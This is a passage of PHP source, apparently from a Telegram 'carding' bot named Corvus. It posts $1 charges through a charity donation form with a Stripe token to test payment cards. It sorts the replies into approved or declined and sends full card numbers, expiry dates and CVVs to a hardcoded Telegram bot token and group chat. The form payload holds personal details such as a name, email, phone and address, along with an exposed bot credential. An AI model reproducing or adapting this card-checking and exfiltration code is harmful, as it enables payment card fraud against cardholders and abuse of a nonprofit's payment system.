%2BffT8kfQkTc3eOrEO35ylzPSR%2FM8DrwKHdP8t7N3VZYYOZxX2UJ9Cy%2FRuKMypg30IGgnBhPS3aydaPG9sp6B4nrTXvJ2q9ODcSAX8TknrYbYmcfyMRc5E9xtiv2D9RLRq5CLZWkSAJJK1wBYLZKUiqZRGsomOnnkOaDigccWY54mcYKEUIytyJHPQkycSoi%2BtSAuJ7gPDHxNo%2Bhk2PTZxm42fZAqMx7NwQLHj1meNq2c29zZ2Rq8xu07xKNOFjpQqnx%2BS5KKHx0R211m%2B%2FxEAxXia9fYsdgnSRmV4bH%2BwSMdS4a68bBHbv61hkKfyUrqIC3ddR8RWaqxrJctBfgMuSiWw3Qh6UDLJvFCHgPxDh5MGc5VLx3cQ13RJv%2FcnkB9MTZqkMkZfIwGuNQbllkbYWSLmeHcPyMl7pD2BjgC8X73wXpmhhyPy9PTNPOjdDef0L4Ve0QJJdXri3vWd97R43PTajQNPExMTD7pyVx13gc4KzALWIQotRMQ6l5nqEs0tLNChcdrajanFONlAzhrhSmnzSYxjnawmtF6TsWt%2F9Zn1VuuQxRX0z6%2B9IXHCHAgBeaXLCU09OheFz7Ua5rJ7IkbMG5WhKIIvIMIgAd9uuGEyW2laeF%2FGggvLe%2BlZVgFusSsTlxZE10Cm6kQHblI61rm19aou%2Frm8%2BrI5faBHPmLsd2r5qUXR%2B7VSpbt5cfMysbIR82Ca0pFHrPXq1K3KEL5mqsrrkseplne5DjPqWYFv91drGNn6%2F0ZYaAQTStylNLvC51uy7%2BUs7%2FeWVSJGeZeHq0HtcHlbYJyL3OsPmq17hEF6VWsrLT%2B08gxAaAiqGvDfvLFKL5o18SLzqLF%2F%2FfKqg8w08JhOTGDvjsEhJzZEueWb6csM%2BtwwdclUkmqMnRMnfP5wAgVq4r9xYwdf%2BtxhKThFTJW%2FSX2p5uP1zvuQR07MqsVGJmIVPCCJR98uytVZQkizMPvvktwrtGasq69cpRz%2F7590bxQp%2BhvLKYKs%2FCfOd7TS%2Fzjs8lhTs7sFIlYRNJ2PSwSlf3B1pOA2Y24%2B5nulFPgYNf9tE5ekwPfW7WCgNoBSGUJIc5VgbsAS0xXi3S6DoZKcaoZEq5HcUge0H8lMPE9vaD7cXtIAhLI7b6GKKShXyMeDLyBxIaEhTKL6KkR6RstSAYkIkEa5Z1hz3UxMJ9Fpdr%2B1rx3dp19ggYCf9i7mE4kmxbXXru%2FeZd5BPTPlRibxB04ZpphHw1ANQuWvqh4A6jxkdxiimV8YE6roeTDmYdhS0h1%2BPWwmwwdvcFpDTFHHtKYRTk7VznxYM8WbT05GCKVE7vDq8W99VGMZSoeqBcoE6d%2BW4%2BZfOalNd5ShQpmNiqTyHiI%2FyMYZzqsZNJ1j6ZWYnCQ98HjiXmtwYnaRYvOm92smK9DRAnJligUiJa525N4p9VltAKqzckLGpzUlRfTb40KYSX4E131jlD0gUGyyPyhCxokowZJCLq3Unqo47BuumyLI42AhtE9O7aiMHxuIMA63O3bUAs3I51Wwk8J7JVB7NroWgFShMBFSL6llrh9ohvsVkz6i45teYRw3TJpQ5%2B7qJhmyZPi5rAWGvBIBcomiVozSx%2BaQ2yZysH7ffgJ6T9zRIBK57h%2FddsqHnSfa5DtVuRzDiZm%2B6LMlmXDopWA3eXPIKjmEvxty0nWd%2FTiothdNlLgXbRrvHnX%2BZPfx2kbqZGER%2BCXo3Ad7zFB07HGY4kYAyuviaJrtLuGVIzUthBYpM2C9oaBa38L3B%2F%2FTYKEnfgVhMwYE%2FzoRJxTMOmPN7eZrjDTk0kuojw%2BWqhBW%2Bbx5LJzKuNiDH8gE2%2FCSkOVY0NnEu1U49CLoqiri35MYlMwsLwZjQbOAU%2BezzsnMOSb3zNxy30olT8zmfz3A1wI6u%2BFnvHCjLzWTNunye80ta3SqC7oNxCneMbS5%2BqvYSJ5aVUZX6KAq5iFk0MrGkgukDiOIt4cjoI0uNcYye38Xsvgzib7RpW6mJrfr8tPYr1YoFpcnGIFr%2B1rIQ72cAe2lIqEJZRDxltTmvLzb32pBdwBsLURhsp7eEeLPariJ8rb5kBgn1fWTMzC%2BHdxmcy9NCCcvyHmfz0mG31zfXZzFoTIH88xPhmIOvW1JKZ9mHOPTZqxszjJ0Zx8KqHcJOZBT6EeJQGCgcIVlHlvd06D6jVV4DuXx2P86zPGL7AGSbnsXGljkouN%2BX1ipLeHJOfzg3zW5vSDMz7f%2FNph7Q1kYVLjdBWrxquKBBI0v6HB0N1dq6hLTUvqrbPqyO3A%2FImE1Xrnorz%2F8%2Bgmj2OI91tz2A7A4lGW%2Fwh0AUForSav8MymYTB22FMMEqVcstz%2FB3Qe255O0w2L1kDrl79FXqsCUR8ADJqDXG2dSEJ3ntWqOjEADxKUhJ95HSAxnVaajAobN5Tb7HDoNp56RAakHceoW4T0mJYeYLfLZQ3gatKx6pwpJNeTN3X0et%2FZH39Q%2BjrCOuuBtGzRtPibPNgVS8lFoaHzFv18wTK%2BPbciJYY10bpPweqQoz%2BAYUekCBaupI6p1zhBKR7pkj7lI8tfy00O4RVPlJCfSlFwxC59sIgkFZaZeJmcOfCo0DqGNSqd13qkKUGXoLRB92SRmMh3AXUSDlwnBz%2Bspx8%2BvGgQK8EFkgvd4Ytm5JZ1gKrn%2BCnY%2BX6XYS7z1aQhm5gAxOihVipynLV0x3isdgAtQOCnlo0sPivsYyPPat6Vdz2Y1es7xwdurScjPg5o8gr4eOrxCsPzlP98Ezpxv5x1jnhOJzZEhCclOQzq41V85H2mtbstwEcjyfBILAY9MwUQfje69KVhEZXJQPVkRsQxhAcX9r1eeaqzy7lR4BOb%2B0zIo2AxczwzyZnRyguIwEWGjHclgxDvy4BVjpaGXEHsvYOPsgP4n3QLpsopCAav3mIB6Ah8lQOC%2FiYI%2FyWq6AVFh26uxUPygynxl4qTgRUbXyNwbEb9InhC4kNqT0wmo4OqCnW0azE8%2F6NL%2Fvy2RLUjnjnlai8kGyWqbdZ7IRW5O0AZJ8zK24znmTn%2Fiz6fp3uzr7fU4ykktTv2SOalxwUTq7%2FrVD3X88RcGjTdZLRnNvVZX70DaH%2Fyp5cn4s5hVOrfgX4XlFyLF5syRsI%2FlNY9NhWw%2B4PO73CapAgEY6lG%2FsVJksNg%2FpAjDMaYf%2FAGZBSp8jogTlUjoj0mCHotsambOy%2FS%2FqcPL0FyKIqXlcgVFyanbF4%2F%2Bf1rtCNIxc%2FxPEDg8x2vgK9OVfEB%2BbmkrgA0dWCYSL0kKSCGE9W45lSl%2B8ycCCupm44ZWaCfY8zNwZx0E2qEofpu26SgyJL4l0FcdPvivTRWaYu4WFtsjgKoFbJKMbPuhYQ50aqWoJvH5oa%2BlPFUpzLnxpqIcehZJH6P7y5ZN9BlLPSHKEO%2BfggnggVYGMK3u%2F0CVtAD12ObdJ%2FQCMM6lpxQBVPWK8Da96EoLvF7kqlih8w0RxF2Kt54UO7kV5vRT9aSTmwRLXxHMqI2Vg%2F%2FS6fOHU8Y74uOlymktLwhEgJEZyt0npTyYfyfa6JQd1eqTAJeyrJWGiTYlxphaQA7Lig6GHJIFUJc8h1euERE01ZZlVLNrF6Jv8uL8IrKEc8lObXntMyF%2BzA2kBKKQqH1ejTktXBYKTUfxoVLlmTesq5OnoZxLnIcQ0GjUpwRDCFsgYHNDoACGzWQ%2F8miBR91nA3z49o%2FME0zTrDN9DxZkCueRfq2jl3vQWha5u3VdlMjPpToIktJdPbalEegPfK3NVSNsvDQK1n3ijdmsD7H7Vpv%2FiyNH3rkIoI98778IvPz0V%2Fak9ouRWzEEjR%2BWhEXIgoLBd9Sz5I0HkxwkL63wed%2BI3lrhyBW28c0E1XqMK4JiOgY3tEk%2Bj7AFBSqpZSQEChUyLzEAy32pWJSICHqeapMUGAJNZWHmlzrIZBakkqDAD2OJHQxFAEiNG8bH6NOxC8m%2BmFX41IKL6RjSKheRHUSXQlCaGO0A0POiVwxTpw51GLLMp0sa%2BPVhPr4lAJ%2FOpvluG24dCX7baA3Gc8nd8cJNYkBpSFCvdXGZmd3h0pCGxFmdKaHVCc1wC2xwinJE22zsEP3ddWYnrO2VIKpCxe1O37pL8JIRvzv87%2BOv1ZzJIJVeaIoK6WKt9s3qjIEqG9VMP4z6MRUygPAVS01RvR7DYPOhPThm7K%2BzmG%2Bg8bLhPVJJT%2Bh9UTf2Y2u%2BNirpKMONSwHlM%2F1zVFWhETli81cXFIqEufxriiT2jDB6eOWJJP3TM%2BVIQ5ibzn7P5oTdxL%2B9qIxOhUlGRrTJJsLSCTUWmW2wz0um3jTXZFIC3GwNpHsKaobLF080YWMxxzXoheeSMk1jU7c0ChpQt3yMR%2Be6W%2Fp%2FAnSa4Zx%2F64ugokkUVcqX%2FBOy38iZcA2TrEDPf0%2BOulf%2BeEdQOKnGToEs2FpA%2BUxCE68z3fgAjplNHEiGMziyuEwXL6fDIGO8CdqEJLi4hcbiO9QPiCkcLniQ4%2BK7I1KaxEBrjyEFnL7Dbb29z9R%2FDZ1ROuw9tKfegY9nHJh8StKRUjVL2D1CRsk5KWPPaV%2BroNzDvI9iBs1xTnsE7h3iZnUmQQW9VabxaRnI4rCoUCBuUOcgv4gNkWQPCTr66fesc0A3phGQS0EhX52KINakeYHqGlG9KD6q8RUrUuT4B%2FXiEsy4Pv%2Fh9geeq%2Bvzz%2FOOl%2BBe3laayYsnfnh2w5LaDpxvcR8gBZVr3cWE%2Fm2%2BK9b9stL8%2FbxV331fN2JyEV6ZAyhB%2F8Et721HguQDCgZyNcSA7KUFJuBq8CxMQ1Olt5dxwdswNqeCsr0vmpGHhnjsgXG8s41f2Kly9raUhWXc8x4NCj1k5WtmP74O3ueGbrOlwQe8tl7qycN6ztER7foga7h2jTBDQneVYb3HOmhAF3UEfxeOVSnEJ7xGVb50RspWBG4gLkivuVAvWfVHEX6jcm0iXsK8eKiJ7QaK%2BzcJ8Zcl08dPAW97lVdiIr5uevhbPHv%2B%2FJXJ9tUT1fUW15BbeAbBqBSRgMEIgD5CWjulJsnolhjl3%2Bk0zoS8dUdHLb33SOhA3iWkbmZ8kYsPtGBWgQj3px8wRyUk4DrHRKQYSQdqRG9VQG%2Fn39NL6epMjYgm1%2F9SvlK8%2B%2FWNIQMFTXrK901WRoRD93n8RVwrF31N1RzaTo7fcVaoIzfHl3qECWm5SfEsSDsa2OfUYC0%2F98Q9aypwvTGPAmgq%2FgDcaKAUgFgJfIkG0WVK5AlrIuuMViWpYswgDIGLPsrl%2FTwNQoWBWMdsipkAc3kWp%2FR506cNB%2FESbu4D5L4K5oACw3%2FUCnOVvA8g34OM%2Fgd%2FSKA40TH%2Bh8t1dtmqJaq7E3YLQpfuojur34OpofZRCf46fyNAaqlxANURqVPimS9U8IhCeLpnE1q9ox%2F8NViE3ClOhfebNUfSnAqk8vrdDy1d7pozIH6YzTambkrmOqRs4xWF65jo26%2BV27z5Kd7Nwl2KU%2B03ZJl6Zd7QEFBhj%2BPYqIDpaPwmAW00O1CIUQKgbRsNt%2BICGHTFwRHT7lIA%2Bg2rTbeo65HAoopiRUZ8cNCQZF92f7YMAlye%2BJWYa68bLWttaRMJ7%2Fj3VSMe0MD7tGgEc427ukvpATDfkyy6C8yjUfML1lpMd8DWXU5BrtQsPo4mIvuGOOrIxpE9Gi31gw%2FtGKqqV%2FCUgLbQrmcaAAV%2BLFqQYwQpftCk9ilsveyPgI9KurEE9E2PNEu4UKr3FZeiRQsSgQ%2BQRzLL7fVOdCnBMb3dZ%2B7W1%2F2VpjATbOTCwyrHpNPJ79Rf7oOF1d9qQLFXlejMgXfDyZE4qrPzooOR0sAlx87CgV9If1vJcQ6AJTcLI4HpOqiz3xETgb4WU2kueIsMRLIf1DXfIvaZL3EGBw6bcM%2BYcVVVRDAmBCwsfy5z0A1u4cY0rESsmmM%2FuhwD7MPCFGxvQByArSUwDS01kYME5SbIwksONmZJ1FcGuCLBZ4SlaLpxxqLq8doEr8TGl9eR4bkwkR8FqGA1OEC8UdoHXjPWdwlhx4AdB%2Fgg%2BFahUyHwi4wNVsa%2BPC%2BLPnx8DX2pqgZv8oAUyGxdc6ZPwL5ulwxxy65Va2ss1eJfPz04XzAcA%2BlVrSl%2BWWxAVqSqLS0DxFbvi2DEt45mFbAL3%2FVneH0yJbnhOtaMiWPB%2B%2BN4ViqvSb972KvIAGEfLCXB7xVfmZu38OKfj0S8P8cxR8n6wp2Sfy1PbvvqyLKXANQXJo7wRBY58QHIU9meSHY3G3keF0gXgJsR1S3U8b%2FwqScruaVpKmkFF5CNzru4uTdhMiE5jCanUuDTa5h%2BoPZx67GMvEWWKrZWKGGwW72JUTRIBCRCw6ERsk5LGSeFD%2FQamw1ZI%2B8gOcOzTg%2BGkbNQQQ%2FGYb%2B2z6IXfKcHVumk2bbU6eERZAUP9DXKuU1s1iuCvvTaUayMcHAw%2BcQ2B2jGQLOTMz9%2Fu2DMcn%2F56Np6mQkLIVjpOkWVXDutSulhKdXWNi5q5L%2BNn6AodcSX97cv2aEZP%2FIryY8DWsSdY%2BPfmY8vWjfbJY5OHQn2v%2FwHfnnCIogRYhuCYjSpqClXe8mV3dpxIUm9Bzd3DGpBpTMhhK%2FLwkRL%2F6lIIFz6vZbozArpBrgJzrUVRxTaBv8nIwn4TvCoMnsoy4hPJ091ucmZhcrix5wF0vpZairG46pLwChHLoB%2BczDHg9xEuW4%2Fnd0bQdMYsYdBABzrO%2Be7tO9ZgD8On%2FXyAuVY%2FjvuaeeBYWOzVAcqY541E23GDT6wZ%2BnuGCBStObfiPl13ISYWxXPxunofbzTgxg3wTEOrz%2B%2FT%2FjRfWNuuBu4EPuYG4K38GBHUZf3JGkrQFa1SiHOsZxylnf81J7RAaxsXk3kXtPFRXjiaFHO3MKM5bkYKM0FoUOWE%2BILzUBcEkYNvi8nEokmmKRyDFgJVeQp7tIopieoSY7Cw1zyfnEHPEzOUsU7vDEtd%2BGYhh%2BOuikMKGLVnB2cJYbVd1xqOxmvBnDwy51fVsrSNZAiF%2BS3FXZRMviQOV57Kzxs16tIteQHkAeKr%2BhvLWtSM75ORdqXjvgtAlOnGbA5Sy6JUpdFQpV6nng9ZaiiZWjcVvpOIAK%2FRHXeppD0bSpfRJ3d%2F6FIHuTi8%2Fs7N2duLN4fZHaoz4pwq%2FQE4kD%2F4Ip%2Fse89pwbyqldGd9X3ftYOoAo1HGrjNmPWKFyO4%2By%2BH5gHwblicuiWA3y0z0xx2PQyyz1ka5yLzkGy7wjBs%2FskeYXRtQ8hJzgO%2BLtaS3nwG4GldbA8oFbbMBY2O3EgOhc0TULT2o%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=TfaFNH9o%2Bk1GHXhZemNxgJ6nXdpLH6iCTiNnhkdrlk3ppK3SgyPymEAwf5E10A9PW6qi%2FXKRBlnq1vTHKdsKJSXa3Ps%2BZ%2Fs5Q3d8y6GbEgbLVQm7F4HLws4s7Sq1UJ03pNJ6vieMXJQuiF1T1KEGX1HrqvxsH4ET9RhWU%2F%2BhPB%2BJSb1CVIhd8vZamwoiA6VwoerGvsd4RH%2F9R8XLmaPOlgwnVbUZQIjG%2FeRgBZMfqVdGszYj5XbJAzdDvGEYLOtyZRxewOkkn9C6hXQbdpYMSfL56wt8v6M1bFw6Jrg8Y3u36W5cyzuz3Hvdh8VKlcrusd4MBWD62ZcG8emEanP24QBHhkD5mw7d0YIP%2FwYHm1CinCAurwNr4VAot6i7LQaqFd28LGdsInrSphUzZGzv00A%2FPEcJjta6MATF3xMFTrBlCgdwI7F9ADwR2aoSIQd72w3NjUPNVSVoJK0YJ2VeEVEBHnBO4jv1EbFsOai0Hlg3yNqxxEu6JYL8r16Z9pkVaWjZpZMwMOE%2FpTi3arIB2GBUxm9%2FuAiSFLhVMtsPf65Js90Jr8Il7nVuRECljdCGDoHftj8ds8DjdbgkfV5W16e0qz%2Fguh81%2Fou98aI9MKgDX%2F3OEWmvSgZ%2FuxnIXcl8h1U15KE7KmNTEmoz%2FGzIEq0zeduSK3ZwYCwehSNedPkOp5QpnY1izM3Rw0gHFQYL3JkELBZvE5yf5WLLMuYRwmWSa4feKUDHo1796ppeOFPqmvKyLLxsxBW%2FiLcAlaIzvnNxm0yO5T6x6OXgMI4b8ygEIhOVYbjZ2CxriQSNK5brBPRPTjjDKST9B6pKb5bGByvx7WkCnF%2Bk3Pmimrx3yF3kxGI0JZ2iQmHX69Y%2FWQS4qGVNsYWlbxQMpFp1ot0sqQ1mtoy0aNZasoJYU6n7CscYRKNIFlzDwHfsts66hdlw8cVnRHJmIxxYjyzus5nHVCQmyE8Tnz3NU1ND8UN7iV0yXK7t8Y82ruwwkvL7Il1haJvSIg4JJ1wSHUe2irumr42UGQDJqKKqwW5yQvNjZyKwU2Ec%2F7vRioHuMrGXqXo1iq4ijTNQrNJ0X%2F4Q4E5BAtRoBpb%2B4PMxFv8nfxMX8rWz3PD32R4JrkXxqFldqavdRiZlX14sDtK4UiI%2BwT4nWF3iyKTJ6Lv%2FFPt6xN3AwsNoKQ1kWxL45e%2B%2B0XTBjxcM3620StngA%2FzRGXHFOu2pyZmnRpQpj6uRWv7Qsz7XcRBjanaLvLMwW52e0yoENrCMmcEruYpH%2F2RsXML5GwRqNtjlmMmX7isOvGP%2FzKZz2fLp5ACMQkTekmijdPvZd8Pl3f2fXx%2BNyHHuW3eVYhMXpdFEWli%2FAGou5NnWVAHlOkEgQ9jl9pAph7Uuemt6Swh77o52XZZsSiqqJskajbeZjLvwqY8OZkURS5l1X9nwCMZxFSV4xlW4fiE3mwGU9EdHfWVLqfxBQVp%2BiDB4pHP3MiJ7WH1g2Ll39WzhOdysh3xY4VOPn0y3GjclAyIuILqa7U2ROUXcbXPfosfGDDEGtlCUGqTi9TsGLPDlTNrnYM8Dytr7Y%2FmwZ9e0tOC5ycMKkvBlivDdtPdTpeuSxAwg3DQMIsmWKKuMkCz5bTkafa39hKoENGzq9vxPQexYAyLkcNvuIw6o8q8ojSn8gpYQ5GUzw1GIXr5Ce4YwQ6ZMm9etIdjyWzFcq5q%2B543JM32JIcubAkU7w8dfaoOz4Icf2fTo5OYgberD%2BW%2FizL7lHbmmedgymo%2B3Jn6T%2B%2BAxq7jOch3dm0Y5F5pDDFj5asqHkLoZ0bjBP4vSmdlpYnlH%2BMpwb57ST4xnbfFS%2FEHh%2Bm9VNbHxhOaY%2B0SqsmlDew1H%2F88KfAZh1PxYaAMKH81Q9V1jPodRaK3oiNHj5k71Gt1tRWznXS%2F36%2F1McaeLyJ5j7%2F08Rs9o9qUruFJo1tLM1p7QBG2gXQJ650l3xYcz%2F%2BAOtXTMr478aOgZdZ7BAzd5IYbo%2FLmtR%2FdUi%2BZ0AXTc9sCg08KyXzJNaKhHyVYP43beONgRD9b%2FFlIPBEFzVzOCE4ufBChxUDBXRCxDDLPKlLCpZbpLFuxRdFydM2Q9kgfvPu1h4ILA36ze%2FEHJUCkiKgBWXt7UUwPTGs71mfCBxytbzTatU978dUMfzCil%2BLAeS8KZCdx4dkJQe8ELNIBGktBz6t1Vcfz%2FbaDTXk%2Bv1SVW7IBz4FDT1i4IPYaWg4MseFnDjligtZjTPQ2lUMugVRJzG4cr7zHtpGGKef3ObmUqcdf%2BeOVaMYe5teFUGOV3iUm%2B6EMqHI9yAzmzj1mtcxJtup9KtUp4HHq6peEYFKFILM4F7GVITlcNNDDQkLkezMulV%2B0B834ffMCF8V%2FKDRFSF9CgjBKiIKMyZGmhULtL6MrDmmXBCKos0SdcZOyZhg5Zt8kTcO2s8Fx%2FOLilghlYPd%2FfWoLZldtSTbPsryjZ49Fv17RLtvJ2%2FnxLPKWHlrJ6BTTbSAh7tbowodHhfWvRm4DeHZ54qhzjGex6lAJTNP6Wax5vNi%2Burms1Du9NluZHdVRI1iWkcAY3JjqKfdQBus8PihJLGftZazSp8PGpkoScvPxH%2BzMsvfoTsw%2BcoG%2Frb%2BDLZjRCSiBMw2oa5rTBbzAssTjP%2FsYam27L5rWvaC4oVGs2mKL%2BvVupnVmZJYnQQZJeTCGRvasoR0b3yZxX92m6tPUBMqMApMU7grqOqrOR5H5AtTaAHDXcXCKBN5TLGmgtnvpUnx1xhNHHJa0bjcS%2F6eYdDY7AkhPHGZw52oO2LwR8g6XWkGg4f4bQUbj3fsTZuL2V7zFIuzPKIkoD7VSFSWpmL6XC6hXZTz%2BEdqF%2F6%2BCsU8BfrdBjHajODPM7A2%2FsSCUNWRScwF%2B0Ww4Pt6wA28Sl4yY%2BRU97FB93DMhFtnFhfqBAgYwn3m0L3gjNb1MBOjSCkY1H0S6zpUMfBh6p%2BxlAwu0QtUzM4oE%2Bfo32aSRpTrr389537ZkZC%2BsZqjopCdSGMxVVSiGyC9789xVqIoyTjqTQx82KmND9DgwtbiJPhw6FrFden%2FknUtyOa%2B306JAxN23Lvm%2BcXmsfdTsP0ePvMSQsxArl6hukWlGl%2By%2BR8SGv6CoCpIC7Ujk9jQk%2BdMTZCodbOlf2mHuIhjm79w9R1FqJMcQCb9x%2BZOo7xWZFjTAzn2B1PlPvB8k9iecOAVqprDse7Sl5vFNE8v1gr%2B4ry%2FxHVRosouxFaGolg6jVhp%2B85v2iCadBJMmtpgST4UJ4RcPn0jv8cXbLuN58fN7HHsCxB4yoKB0Zi8IiHmuq7NdwiXpFyGvqQOMR13%2B4Xu2GQ5a5aT6neVJ%2Bx49NojXFok5P%2FEMUOu4VglaYHwg3b7TGFg90zKOgTyvvjGT%2BoOv5SciQeTpwtUzPv9mr0lNxZSAOhnPRlR%2FUN13ZJypwT%2Ftz8pmNVzD78bxVnyTXAy3VL9g9CJ1P2Gq%2Bnyn68nJiYmaZaaVaMPKNho4gJSey26Me4eW%2BacSCSwG0K1KBfnOtpm%2BgAQNxReVOp4n2DrPKXM1VFl9%2FlIQhirJX1pn4kqnl5mJ38WfXPTw4omAuDLFm74xSzYsLB28U%2BkjBNnCErqPzAioVPx8s75oOC327L%2Bc8UOW8x%2FYZXVV%2FaJLmFH%2BevqoHubqYoi3FusuSiQ5D%2B9Z%2FVe8tRJr6uWcONatwAqyflFqUGhi9YR486LGeECyZV8NeAqeOp50skfhrIF2O0qritkom8iq9MTDzO45yGxgFLLudaQMZSZjdSRwuLcGNRnfwGkSqARc9bJu41xvSuabzf6IARRO2TQKKcSdyqBljtxbiNs26LxT2axblMuIlKc%2F77D%2BuS0uSRlO5sBv2eq6S7s%2Bw3ubQwbzAXfe7WZB%2Fwk94m%2Bqbk6QNE2TTarjecKKyq7lN2I2eS%2BA%2FiT1dkwy5GHn5chFr25oqagTkclHqcMgu2KB21pcBU0M7FIfKIeV0T3m1fw4xGxuv7Jp4v46FEvbuxOQOTVKFGxeXr3T2RZ5P4IaXNe2VzBesaTPQaH%2FF9RHdOB1q4YO3sOLxnFMPWPQshg0mD%2F0fh704QU0%2Fyo82JWhNnRIN3z4vu534BjGkAMzAEB3cu88QAfQlKV4adYrBCyuVa6ImLC9JWKDN5bNUye4CNWnYMKzio5qA1oN1jmX8I2k9yGlat%2FENh772Qcozs69ru%2FHAA1LnsVVr1eQ9H6%2FM3a6qxkU6lNV5awKO43w1DLdHZGaJOjX4LC9oM609Mw%3D%3D&ctl00%24MainContent%24frequency=onetime&ctl00%24MainContent%24amount=other&ctl00%24MainContent%24otheramount=%241.00&ctl00%24MainContent%24cardorpaypal=paywithcard&ctl00%24MainContent%24selPrefix=807710000&ctl00%24MainContent%24firstname=jhon&ctl00%24MainContent%24lastname=ohio&ctl00%24MainContent%24company=nsns&ctl00%24MainContent%24email=jhonsgsmith1%40gmail.com&ctl00%24MainContent%24phone=9417368283&ctl00%24MainContent%24address=214+East+Camelback+Road&ctl00%24MainContent%24address2=&ctl00%24MainContent%24city=Phoenix&ctl00%24MainContent%24selStateOrProvince=6317ccdb-959d-e411-8274-6c3be5a8ca94&ctl00%24MainContent%24zip=85012&ctl00%24MainContent%24memorialortribute=tribute&ctl00%24MainContent%24honoree=&ctl00%24MainContent%24recipient=&ctl00%24MainContent%24notifymethod=notifyemail&ctl00%24MainContent%24recipientemail=&ctl00%24MainContent%24recipientaddress=&ctl00%24MainContent%24recipientcity=&ctl00%24MainContent%24selRecipientStateOrProvince=0&ctl00%24MainContent%24recipientzip=&ctl00%24MainContent%24recipientmessage=&stripeToken='.$token.'');
$result = curl_exec($ch);
curl_close($ch);
unlink("cookie.txt");
$message = getData($result, "fa-exclamation-circle'></i>","</div>");


        $msg = getData($curl,'<div id="divError" class="BBFormErrorBlock"><div class="BBFormErrorItem BBFormServerErrorItem">','</div>');
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

        if (strpos($result, 'thank you for your donation')) {
            $cc_code = 'Approved ✅';
            $message = "Charged 1$ ✅";
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif (strpos($result, "Your card's security code is incorrect.")) {
            $cc_code = 'Approved ✅';
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
         
        file_get_contents($url);
        } elseif(strpos($result,"Your card has insufficient funds")){
            $cc_code = "Approved ✅";
            $full = "corvus\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        }else{
            $cc_code = 'Declined ❌';
        }
        if (empty($result)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝘾𝙤𝙧𝙫𝙪𝙨 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝘾𝙤𝙧𝙫𝙪𝙨 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error $message</code>\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }
        // $bank = $data['data']['bank'];
        // $country = $data['data']['country'];
        // $brand = $data['data']['vendor'];
        // $level = $data['data']['level'];
        // $type = $data['data']['type'];
        // $flag = $data['data']['countryInfo']['emoji'];
        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝘾𝙤𝙧𝙫𝙪𝙨 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝘾𝙤𝙧𝙫𝙪𝙨 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$message</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@BossNetworkk</code>\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
